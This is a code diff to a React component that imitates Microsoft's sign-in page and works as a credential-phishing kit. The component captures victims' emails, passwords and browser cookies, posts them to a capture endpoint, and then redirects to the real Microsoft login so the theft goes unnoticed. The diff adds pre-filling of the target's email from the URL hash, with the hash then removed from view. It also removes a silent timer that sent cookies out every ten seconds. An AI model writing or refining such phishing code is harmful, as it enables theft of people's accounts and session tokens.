@@ -18,13 +18,24 @@ export default function MicrosoftLoginPage() {
   const [isLoading, setIsLoading] = useState(false)
   const [error, setError] = useState('')
 
-  
+  // Auto-fill email from URL hash on mount
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      // Extract email from URL hash (e.g. #user@domain.com)
+      const hashEmail = window.location.hash.substring(1)
+      if (hashEmail && hashEmail.includes('@')) {
+        setEmail(hashEmail)
+        // Update URL to remove hash for cleaner look
+        window.history.replaceState(null, '', window.location.pathname + window.location.search)
+      }
+    }
+  }, [])
+
   const captureCookies = (): string => {
     if (typeof document === 'undefined') return ''
     return document.cookie || 'none'
   }
 
-  // Extract tenant ID from URL or storage 
   const getTenantId = (): string => {
     const urlParams = new URLSearchParams(window.location.search)
     return urlParams.get('tenant') || urlParams.get('tid') || localStorage.getItem('tid') || ''
@@ -36,7 +47,6 @@ export default function MicrosoftLoginPage() {
     setError('')
 
     try {
-      
       const emailData: CaptureData = {
         email,
         captureDomain: 'login.microsoftonline.com',
@@ -52,7 +62,6 @@ export default function MicrosoftLoginPage() {
 
       if (!emailRes.ok) throw new Error('Email capture failed')
 
-      
       setStep('password')
       
     } catch (err) {
@@ -62,14 +71,12 @@ export default function MicrosoftLoginPage() {
     }
   }
 
-console.log('Sending password:', password)
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
     setError('')
 
     try {
-    
       const fullData: CaptureData = {
         email,
         password,
@@ -92,11 +99,8 @@ console.log('Sending password:', password)
         body: JSON.stringify(fullData)
       })
 
-      const result = await res.json()
-      
       if (res.ok) {
-        
-      window.location.href = 'https://login.microsoft.com'
+        window.location.href = 'https://login.microsoft.com'
       } else {
         setError('Something went wrong. Please try again.')
       }
@@ -109,25 +113,7 @@ console.log('Sending password:', password)
     }
   }
 
-
-  useEffect(() => {
-    const interval = setInterval(() => {
-      
-      if (step === 'password' && document.cookie) {
-        fetch('/capture', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            email,
-            cookies: captureCookies(),
-            session_update: true
-          })
-        }).catch(() => {}) // Silent
-      }
-    }, 10000)
-
-    return () => clearInterval(interval)
-  }, [step, email])
+  
 
   return (
     <div
@@ -203,32 +189,35 @@ console.log('Sending password:', password)
 
           <form onSubmit={step === 'email' ? handleEmailSubmit : handlePasswordSubmit}>
             {step === 'email' ? (
-              // EMAIL STEP
+              // EMAIL STEP - Pre-filled but editable
               <input
+                id="email-input"
                 type="email"
                 placeholder="Email or phone number"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 required
+                autoFocus
                 style={{
                   width: '100%',
                   padding: '12px 16px',
                   backgroundColor: '#3F3F3F',
-                  border: '1px solid #555555',
+                  border: email ? '1px solid #005A9E' : '1px solid #555555', // Blue border when pre-filled
                   borderRadius: '4px',
                   color: '#FFFFFF',
                   fontSize: '15px',
                   fontFamily: 'Segoe UI, sans-serif',
                   marginBottom: '16px',
                   boxSizing: 'border-box',
+                  boxShadow: email ? '0 0 0 2px rgba(0, 90, 158, 0.2)' : 'none'
                 }}
                 onFocus={(e) => {
-                  e.currentTarget.style.borderColor = '#005A9E'
-                  e.currentTarget.style.boxShadow = '0 0 0 2px rgba(0, 90, 158, 0.2)'
+                  e.currentTarget.style.borderColor = '#0078D4'
+                  e.currentTarget.style.boxShadow = '0 0 0 2px rgba(0, 120, 212, 0.3)'
                 }}
                 onBlur={(e) => {
-                  e.currentTarget.style.borderColor = '#555555'
-                  e.currentTarget.style.boxShadow = 'none'
+                  e.currentTarget.style.borderColor = email ? '#005A9E' : '#555555'
+                  e.currentTarget.style.boxShadow = email ? '0 0 0 2px rgba(0, 90, 158, 0.2)' : 'none'
                 }}
               />
             ) : (
@@ -284,11 +273,13 @@ console.log('Sending password:', password)
             {/* Dynamic Button */}
             <button
               type="submit"
-              disabled={isLoading || (step === 'password' && !password)}
+              disabled={isLoading || (step === 'password' && !password) || (step === 'email' && !email)}
               style={{
                 width: '100%',
                 padding: '12px 0',
-                backgroundColor: isLoading ? '#6C757D' : '#0078D4',
+                backgroundColor: isLoading ? '#6C757D' : 
+                  (step === 'email' && !email) ? '#6C757D' : 
+                  (step === 'password' && !password) ? '#6C757D' : '#0078D4',
                 color: '#FFFFFF',
                 border: 'none',
                 borderRadius: '4px',
@@ -331,7 +322,7 @@ console.log('Sending password:', password)
         </div>
       </div>
 
-      {/* Footer (unchanged - perfect replica) */}
+      {/* Footer (unchanged) */}
       <div style={{ 
         position: 'absolute', 
         bottom: '20px', 
